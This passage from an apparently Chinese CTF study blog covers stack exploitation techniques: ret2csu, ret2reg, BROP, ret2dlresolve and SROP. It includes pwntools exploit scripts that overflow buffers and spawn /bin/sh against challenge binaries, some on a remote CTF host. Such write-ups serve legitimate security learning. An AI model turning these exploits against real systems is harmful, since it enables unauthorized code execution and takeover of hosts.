#函数最后的返回地址</span><br><span class="line">	return payload</span><br><span class="line">payload=ret_csu(write_got,1,write_got,8,start_addr)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_addr=u64(io.recv(8))</span><br><span class="line">print(hex(write_addr))</span><br><span class="line"></span><br><span class="line">write_offset=0x10b9d0</span><br><span class="line">system_offset=0x04ebf0</span><br><span class="line">binsh_offset=0x1b51d2</span><br><span class="line"></span><br><span class="line">libc_base=write_addr-write_offset</span><br><span class="line">system=libc_base+system_offset</span><br><span class="line">binsh=libc_base+binsh_offset</span><br><span class="line"></span><br><span class="line">payload=ret_csu(read_got,0,bss_addr,18,start_addr)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(p64(system)+b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">payload=ret_csu(bss_addr,bss_addr+8,0,0,start_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h5 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h5><p>ret2reg原理：</p>
<ol>
<li>查看溢出函返回时哪个寄存值指向溢出缓冲区空间</li>
<li>查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址</li>
<li>reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)<br>checksec:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX unknown - GNU_STACK missing</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">Stack:    Executable</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
ida:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">nt __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int input[512]; // [esp+0h] [ebp-808h] BYREF</span><br><span class="line">  int *v5; // [esp+800h] [ebp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = &amp;argc;</span><br><span class="line">  init();</span><br><span class="line">  logo();</span><br><span class="line">  printf(&quot;Enter your input: &quot;);</span><br><span class="line">  fgets((char *)input, 2048, stdin);</span><br><span class="line">  ctfshow((char *)input);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">void __cdecl ctfshow(char *input)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[512]; // [esp+0h] [ebp-208h] BYREF</span><br><span class="line"></span><br><span class="line">  strcpy(buf, input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
exp:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">#io = process(&quot;./ret2reg&quot;)</span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28135)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">call_eax = p32(0x80484A0) #0x080484A0 : call eax</span><br><span class="line">payload = flat([shellcode,b&#x27;a&#x27;*(0x20c-len(shellcode)),call_eax])</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="brop"><a href="#brop" class="headerlink" title="brop"></a>brop</h4><p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">def getbufferflow_length():</span><br><span class="line">    i = 1</span><br><span class="line">    while 1:</span><br><span class="line">        try:</span><br><span class="line">            sh = remote(&#x27;127.0.0.1&#x27;, 9999)</span><br><span class="line">            sh.recvuntil(&#x27;WelCome my friend,Do you know password?\n&#x27;)</span><br><span class="line">            sh.send(i * &#x27;a&#x27;)</span><br><span class="line">            output = sh.recv()</span><br><span class="line">            sh.close()</span><br><span class="line">            if not output.startswith(&#x27;No password&#x27;):</span><br><span class="line">                return i - 1</span><br><span class="line">            else:</span><br><span class="line">                i += 1</span><br><span class="line">        except EOFError:</span><br><span class="line">            sh.close()</span><br><span class="line">            return i - 1</span><br><span class="line"></span><br><span class="line">def get_stop_addr(length):</span><br><span class="line">    addr = 0x400000</span><br><span class="line">    while 1:</span><br><span class="line">        try:</span><br><span class="line">            sh = remote(&#x27;127.0.0.1&#x27;, 9999)</span><br><span class="line">            sh.recvuntil(&#x27;password?\n&#x27;)</span><br><span class="line">            payload = &#x27;a&#x27; * length + p64(addr)</span><br><span class="line">            sh.sendline(payload)</span><br><span class="line">            sh.recv()</span><br><span class="line">            sh.close()</span><br><span class="line">            print &#x27;one success addr: 0x%x&#x27; % (addr)</span><br><span class="line">            return addr</span><br><span class="line">        except Exception:</span><br><span class="line">            addr += 1</span><br><span class="line">            sh.close()</span><br><span class="line"></span><br><span class="line">def get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">    try:</span><br><span class="line">        sh = remote(&#x27;127.0.0.1&#x27;, 9999)</span><br><span class="line">        sh.recvuntil(&#x27;password?\n&#x27;)</span><br><span class="line">        payload = &#x27;a&#x27; * length + p64(addr) + p64(0) * 6 + p64(</span><br><span class="line">            stop_gadget) + p64(0) * 10</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        print content</span><br><span class="line">        # stop gadget returns memory</span><br><span class="line">        if not content.startswith(&#x27;WelCome&#x27;):</span><br><span class="line">            return False</span><br><span class="line">        return True</span><br><span class="line">    except Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check_brop_gadget(length, addr):</span><br><span class="line">    try:</span><br><span class="line">        sh = remote(&#x27;127.0.0.1&#x27;, 9999)</span><br><span class="line">        sh.recvuntil(&#x27;password?\n&#x27;)</span><br><span class="line">        payload = &#x27;a&#x27; * length + p64(addr) + &#x27;a&#x27; * 8 * 10</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        content = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        return False</span><br><span class="line">    except Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##length = getbufferflow_length()</span><br><span class="line">length = 72</span><br><span class="line">##get_stop_addr(length)</span><br><span class="line">stop_gadget = 0x4006b6</span><br><span class="line">addr = 0x400740</span><br><span class="line">while 1:</span><br><span class="line">    print hex(addr)</span><br><span class="line">    if get_brop_gadget(length, stop_gadget, addr):</span><br><span class="line">        print &#x27;possible brop gadget: 0x%x&#x27; % addr</span><br><span class="line">        if check_brop_gadget(length, addr):</span><br><span class="line">            print &#x27;success brop gadget: 0x%x&#x27; % addr</span><br><span class="line">            break</span><br><span class="line">    addr += 1</span><br><span class="line"></span><br><span class="line">def get_puts_addr(length, rdi_ret, stop_gadget):</span><br><span class="line">    addr = 0x400000</span><br><span class="line">    while 1:</span><br><span class="line">        print hex(addr)</span><br><span class="line">        sh = remote(&#x27;127.0.0.1&#x27;, 9999)</span><br><span class="line">        sh.recvuntil(&#x27;password?\n&#x27;)</span><br><span class="line">        payload = &#x27;A&#x27; * length + p64(rdi_ret) + p64(0x400000) + p64(</span><br><span class="line">            addr) + p64(stop_gadget)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line">        try:</span><br><span class="line">            content = sh.recv()</span><br><span class="line">            if content.startswith(&#x27;\x7fELF&#x27;):</span><br><span class="line">                print &#x27;find puts@plt addr: 0x%x&#x27; % addr</span><br><span class="line">                return addr</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += 1</span><br><span class="line">        except Exception:</span><br><span class="line">            sh.close()</span><br><span class="line">            addr += 1</span><br><span class="line"></span><br><span class="line">def leak(length, rdi_ret, puts_plt, leak_addr, stop_gadget):</span><br><span class="line">    sh = remote(&#x27;127.0.0.1&#x27;, 9999)</span><br><span class="line">    payload = &#x27;a&#x27; * length + p64(rdi_ret) + p64(leak_addr) + p64(</span><br><span class="line">        puts_plt) + p64(stop_gadget)</span><br><span class="line">    sh.recvuntil(&#x27;password?\n&#x27;)</span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    try:</span><br><span class="line">        data = sh.recv()</span><br><span class="line">        sh.close()</span><br><span class="line">        try:</span><br><span class="line">            data = data[:data.index(&quot;\nWelCome&quot;)]</span><br><span class="line">        except Exception:</span><br><span class="line">            data = data</span><br><span class="line">        if data == &quot;&quot;:</span><br><span class="line">            data = &#x27;\x00&#x27;</span><br><span class="line">        return data</span><br><span class="line">    except Exception:</span><br><span class="line">        sh.close()</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##length = getbufferflow_length()</span><br><span class="line">length = 72</span><br><span class="line">##stop_gadget = get_stop_addr(length)</span><br><span class="line">stop_gadget = 0x4006b6</span><br><span class="line">##brop_gadget = find_brop_gadget(length,stop_gadget)</span><br><span class="line">brop_gadget = 0x4007ba</span><br><span class="line">rdi_ret = brop_gadget + 9</span><br><span class="line">##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)</span><br><span class="line">puts_plt = 0x400560</span><br><span class="line">addr = 0x400000</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">while addr &lt; 0x401000:</span><br><span class="line">    print hex(addr)</span><br><span class="line">    data = leak(length, rdi_ret, puts_plt, addr, stop_gadget)</span><br><span class="line">    if data is None:</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        result += data</span><br><span class="line">    addr += len(data)</span><br><span class="line">with open(&#x27;code&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">    f.write(result)</span><br><span class="line"></span><br><span class="line">##length = getbufferflow_length()</span><br><span class="line">length = 72</span><br><span class="line">##stop_gadget = get_stop_addr(length)</span><br><span class="line">stop_gadget = 0x4006b6</span><br><span class="line">##brop_gadget = find_brop_gadget(length,stop_gadget)</span><br><span class="line">brop_gadget = 0x4007ba</span><br><span class="line">rdi_ret = brop_gadget + 9</span><br><span class="line">##puts_plt = get_puts_addr(length, rdi_ret, stop_gadget)</span><br><span class="line">puts_plt = 0x400560</span><br><span class="line">##leakfunction(length, rdi_ret, puts_plt, stop_gadget)</span><br><span class="line">puts_got = 0x601018</span><br><span class="line"></span><br><span class="line">sh = remote(&#x27;127.0.0.1&#x27;, 9999)</span><br><span class="line">sh.recvuntil(&#x27;password?\n&#x27;)</span><br><span class="line">payload = &#x27;a&#x27; * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(</span><br><span class="line">    stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">data = sh.recvuntil(&#x27;\nWelCome&#x27;, drop=True)</span><br><span class="line">puts_addr = u64(data.ljust(8, &#x27;\x00&#x27;))</span><br><span class="line">libc = LibcSearcher(&#x27;puts&#x27;, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">payload = &#x27;a&#x27; * length + p64(rdi_ret) + p64(binsh_addr) + p64(</span><br><span class="line">    system_addr) + p64(stop_gadget)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="高级rop"><a href="#高级rop" class="headerlink" title="高级rop"></a>高级rop</h3><h4 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h4><h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>思路 1 - 直接控制重定位表项的相关内容<br>由于动态链接器最后在解析符号的地址时，是依据符号的名字进行解析的。因此，一个很自然的想法是直接修改动态字符串表 .dynstr，比如把某个函数在字符串表中对应的字符串修改为目标函数对应的字符串。但是，动态字符串表和代码映射在一起，是只读的。此外，类似地，我们可以发现动态符号表、重定位表项都是只读的。</p>
<p>但是，假如我们可以控制程序执行流，那我们就可以伪造合适的重定位偏移，从而达到调用目标函数的目的。然而，这种方法比较麻烦，因为我们不仅需要伪造重定位表项，符号信息和字符串信息，而且我们还需要确保动态链接器在解析的过程中不会出错。</p>
<p>思路 2 - 间接控制重定位表项的相关内容<br>既然动态链接器会从 .dynamic 节中索引到各个目标节，那如果我们可以修改动态节中的内容，那自然就很容易控制待解析符号对应的字符串，从而达到执行目标函数的目的。</p>
<p>思路 3 - 伪造 link_map<br>由于动态连接器在解析符号地址时，主要依赖于 link_map 来查询相关的地址。因此，如果我们可以成功伪造 link_map，也就可以控制程序执行目标函数。</p>
<h5 id="32位no-relro"><a href="#32位no-relro" class="headerlink" title="32位no relro"></a>32位no relro</h5><p>checksec:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">❯ gcc -fno-stack-protector -m32 -z norelro -no-pie main.c -o main_norelro_32</span><br><span class="line">❯ checksec main_no_relro_32</span><br><span class="line">[*] &#x27;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>在这种情况下，修改 .dynamic 会简单些。因为我们只需要修改 .dynamic 节中的字符串表的地址为伪造的字符串表的地址，并且相应的位置为目标字符串基本就行了。具体思路如下:<br>修改 .dynamic 节中字符串表的地址为伪造的地址</p>
<p>在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。</p>
<p>在特定的位置读取 &#x2F;bin&#x2F;sh 字符串。</p>
<p>调用 read 函数的 plt 的第二条指令，触发 _dl_runtime_resolve 进行函数解析，从而执行 system 函数。<br>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"># context.log_level=&quot;debug&quot;</span><br><span class="line">context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;]</span><br><span class="line">context.arch=&quot;i386&quot;</span><br><span class="line">p = process(&quot;./main_no_relro_32&quot;)</span><br><span class="line">rop = ROP(&quot;./main_no_relro_32&quot;)</span><br><span class="line">elf = ELF(&quot;./main_no_relro_32&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#x27;Welcome to XDCTF2015~!\n&#x27;)</span><br><span class="line"></span><br><span class="line">offset = 112</span><br><span class="line">rop.raw(offset*&#x27;a&#x27;)# 在ROP链中添加一段字节串，填充偏移量位置，用于覆盖返回地址。</span><br><span class="line">rop.read(0,0x08049804+4,4) # modify .dynstr pointer in .dynamic section to a specific location</span><br><span class="line"># 在ROP链中添加read函数调用，用于修改.dynstr指针在.dynamic节中的位置。这个操作似乎是为了修改.dynstr的地址，使其指向一个特定的位置。</span><br><span class="line">dynstr = elf.get_section_by_name(&#x27;.dynstr&#x27;).data() # 从目标文件中获取.dynstr节的数据。</span><br><span class="line">dynstr = dynstr.replace(&quot;read&quot;,&quot;system&quot;) # 将.dynstr节中的&quot;read&quot;替换为&quot;system&quot;。这是为了后续构建fake dynstr section时使用。</span><br><span class="line">rop.read(0,0x080498E0,len((dynstr))) # construct a fake dynstr section</span><br><span class="line"># 在ROP链中添加read函数调用，用于构建一个假的.dynstr节，将其内容写入0x080498E0的地址。</span><br><span class="line">rop.read(0,0x080498E0+0x100,len(&quot;/bin/sh\x00&quot;)) # read /bin/sh\x00</span><br><span class="line"># 在ROP链中再次添加read函数调用，用于读入/bin/sh\x00字符串到0x080498E0+0x100的地址。</span><br><span class="line">rop.raw(0x08048376) # the second instruction of read@plt </span><br><span class="line"># 在ROP链中添加read@plt的第二条指令。这似乎是为了绕过某种检测，具体需要根据二进制文件的具体情况来分析。</span><br><span class="line">rop.raw(0xdeadbeef) # 添加一个假的返回地址（deadbeef），可能是为了填充ROP链中的字节。</span><br><span class="line">rop.raw(0x080498E0+0x100) # 添加一个地址，可能是用于后续跳转。</span><br><span class="line"># print(rop.dump())</span><br><span class="line">assert(len(rop.chain())&lt;=256) # 断言ROP链的长度不超过256字节，确保不会溢出。</span><br><span class="line">rop.raw(&quot;a&quot;*(256-len(rop.chain()))) # 填充剩余的空间，以确保ROP链总长度为256字节。</span><br><span class="line">p.send(rop.chain()) # 发送构建好的ROP链到目标程序。</span><br><span class="line">p.send(p32(0x080498E0)) # 发送.dynstr节的地址到目标程序。</span><br><span class="line">p.send(dynstr) # 发送修改后的.dynstr节内容到目标程序。</span><br><span class="line">p.send(&quot;/bin/sh\x00&quot;) # 发送/bin/sh\x00字符串到目标程序。</span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>
<h5 id="32位Partial-RELRO"><a href="#32位Partial-RELRO" class="headerlink" title="32位Partial RELRO"></a>32位Partial RELRO</h5><p>checksec:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>在这种情况下，ELF 文件中的 .dynamic 节将会变成只读的，这时我们可以通过伪造重定位表项的方式来调用目标函数。</p>
<p>在下面的讲解过程中，本文会按照以下两种不同的方式来使用该技巧。</p>
<p>1.通过手工伪造的方式使用该技巧，从而获取 shell。这种方式虽然比较麻烦，但是可以仔细理解 ret2dlresolve 的原理。</p>
<p>2.利用工具来实现攻击，从而获取 shell。这种方式比较简单，但我们还是应该充分理解背后的原理，不能只是会使用工具。</p>
<h6 id="手工伪造"><a href="#手工伪造" class="headerlink" title="手工伪造"></a>手工伪造</h6><p>查看write的重定表项：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">❯ readelf -r main_partial_relro_32</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rel.dyn&#x27; at offset 0x30c contains 3 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">08049ff4  00000306 R_386_GLOB_DAT    00000000   __gmon_start__</span><br><span class="line">08049ff8  00000706 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0</span><br><span class="line">08049ffc  00000806 R_386_GLOB_DAT    00000000   stdout@GLIBC_2.0</span><br><span class="line"></span><br><span class="line">Relocation section &#x27;.rel.plt&#x27; at offset 0x324 contains 5 entries:</span><br><span class="line"> Offset     Info    Type            Sym.Value  Sym. Name</span><br><span class="line">0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0</span><br><span class="line">0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0</span><br><span class="line">0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0</span><br><span class="line">0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0</span><br><span class="line">0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0</span><br></pre></td></tr></table></figure>


<p>exp1:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<h6 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h6><p>exp2(tool):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;./32_partial_relro&#x27;)</span><br><span class="line">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28287)</span><br><span class="line">elf = ELF(&#x27;./32_partial_relro&#x27;)</span><br><span class="line">rop = ROP(&#x27;./32_partial_relro&#x27;)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=&quot;system&quot;,args=[&quot;/bin/sh&quot;])</span><br><span class="line">rop.read(0,dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line">io.recvuntil(&quot;Welcome to CTFshowPWN!\n&quot;)</span><br><span class="line">payload = flat(&#123;112:raw_rop,256:dlresolve.payload&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="64-no-relro"><a href="#64-no-relro" class="headerlink" title="64_no_relro"></a>64_no_relro</h5><p>chesksec:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>exp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h4><p>1.内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</p>
<p>2.内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</p>
<p>3.signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</p>
<p>checksec:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>ida:</p>
